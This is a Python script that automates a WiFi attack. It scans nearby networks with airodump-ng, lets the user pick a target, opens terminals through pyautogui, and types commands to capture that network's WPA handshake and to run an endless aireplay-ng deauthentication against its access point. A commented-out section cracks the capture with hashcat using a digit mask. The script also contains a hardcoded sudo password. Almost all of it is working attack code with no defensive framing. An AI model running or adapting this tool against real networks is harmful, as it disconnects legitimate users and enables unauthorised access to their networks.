import time
import pyautogui
import threading
import os
import subprocess
import signal
import re
import csv

def SendWiFis():
    try:
        os.system("sudo rm Projects/WiFi-ng/Handshakes/*")
        #p = os.system("sudo airmon-ng start wlan0")
        p = subprocess.Popen(["airodump-ng", "wlan0mon","--band","abg"],stdout=subprocess.PIPE,text=True,universal_newlines=True)
        time.sleep(3)
        with open("/home/jfrans/Desktop/Wifis.txt",'w') as f:
            for i in range(3000):
                f.write(p.stdout.readline())
            p.stdout.close()
        wifis = []
        with open("/home/jfrans/Desktop/Wifis.txt",'r') as f:
            for i in f.readlines():
                i = i.strip().split()
                if len(i)>10:
                    if re.search(r"..:..:..:..:..:..",i[0]):
                        if [i[0],i[5],i[10]] not in wifis and '<' not in i[10] and '0K' not in i[10]:
                            wifis.append([i[0],i[5],i[10]])
        print(wifis)
        return wifis

    except Exception as e:
        os.system("sudo airmon-ng stop wlan0mon")
        print("Wlan stopped i think")
        os.system("iwconfig")
        print(e)

def CapHand(victim):
    try:
        pyautogui.hotkey("alt","ctrl","t")
        time.sleep(0.5)
        pyautogui.hotkey("win","right")
        time.sleep(0.5)
        pyautogui.typewrite("sudo airodump-ng --band abg -w Projects/WiFi-ng/Handshakes/hans -c "+victim[1]+" --bssid "+victim[0]+" wlan0mon",interval=0.1)
        pyautogui.press('enter')
        time.sleep(0.5)
        pyautogui.typewrite("7373",interval=0.08)
        pyautogui.press('enter')
        #pyautogui.hotkey("alt","tab")

    except Exception as e:
        os.system("sudo airmon-ng stop wlan0mon")
        print("Wlan stopped I think")
        os.system("iwconfig")
        print(e)

def Deauth(victim):
    pyautogui.hotkey("ctrl","alt","t")
    time.sleep(1)
    pyautogui.hotkey("win","left")
    pyautogui.typewrite("sudo aireplay-ng --deauth 0 -a "+victim[0]+" wlan0mon",interval=0.08)
    pyautogui.press('enter')
    time.sleep(0.5)
    pyautogui.typewrite("7373",interval=0.08)
    pyautogui.press('enter')

def GetInput():
    ch=""
    while True:
        ch = input("Enter Target ESSID: ")
        for i in wifis[::-1]:
            if ch == i[2]:
                print(i)
                return i
        print("Target Not Found.")

#try:
    #os.system("sudo rm Projects/WiFi/Handshakes/*")
p = os.system("sudo airmon-ng start wlan0")
    #p = subprocess.Popen(["airodump-ng", "wlan0mon","--band","abg"],stdout=subprocess.PIPE,text=True,universal_newlines=True)
    #time.sleep(3)
    # with open("Desktop/Wifis.txt",'w') as f:
    #     for i in range(2000):
    # #         f.write(p.stdout.readline())
    # #     p.stdout.close()
    # # wifis = []
    # # with open("Desktop/Wifis.txt",'r') as f:
    # #     for i in f.readlines():
    # #         i = i.strip().split()
    # #         if re.search(r"..:..:..:..:..:..",i[0]) and len(i)>9:
    # #             if [i[0],i[5],i[10]] not in wifis and '<' not in i[10]:
    # #                 wifis.append([i[0],i[5],i[10]])
#     wifis = SendWiFis()
#     for i in wifis:
#         print(i)
#     time.sleep(1)
#     victim = GetInput()
#     time.sleep(0.5)
#     pyautogui.hotkey("alt","ctrl","t")
#     time.sleep(0.5)
#     pyautogui.typewrite("sudo airodump-ng --band abg -w Projects/WiFi/Handshakes/hans -c "+victim[1]+" --bssid "+victim[0]+" wlan0mon",interval=0.1)
#     pyautogui.press('enter')
#     time.sleep(0.5)
#     pyautogui.typewrite("7373",interval=0.08)
#     pyautogui.press('enter')
#     pyautogui.hotkey("alt","tab")
#     #p1 = subprocess.Popen(["airodump-ng","--band","abg",'-w','Projects/WiFi/Handshakes/hans','-c',victim[1],'--bssid',victim[0],'wlan0mon'],stdout=subprocess.PIPE,text=True,universal_newlines=True)
#     # while True:
#     #     if 'handshake' in p1.stdout.readline():
#     #         break
#     input("Handshake Captured?")
#     time.sleep(0.5)
#     pyautogui.hotkey("alt","tab")
#     time.sleep(0.5)
#     pyautogui.hotkey("ctrl","c")
#     os.system("hcxpcapngtool -o Projects/WiFi/Handshakes/catcomp.hc22000 Projects/WiFi/Handshakes/*.cap")
#     os.system("hashcat -w 3 -a 3 -m 22000 -i --increment-min 8 Projects/WiFi/Handshakes/catcomp.hc22000 ?d?d?d?d?d?d?d?d?d?d")
#     #pyautogui.hotkey("ctrl","c")
#     os.system("sudo airmon-ng stop wlan0mon")
#     os.killpg(os.getpgid(p.pid),signal.SIGTERM)
#     os.killpg(os.getpgid(p1.pid),signal.SIGTERM)
#
# except Exception as e:
#     os.system("sudo airmon-ng stop wlan0mon")
#     print("Wlan stopped i think")
#     os.system("iwconfig")
#     print(e)
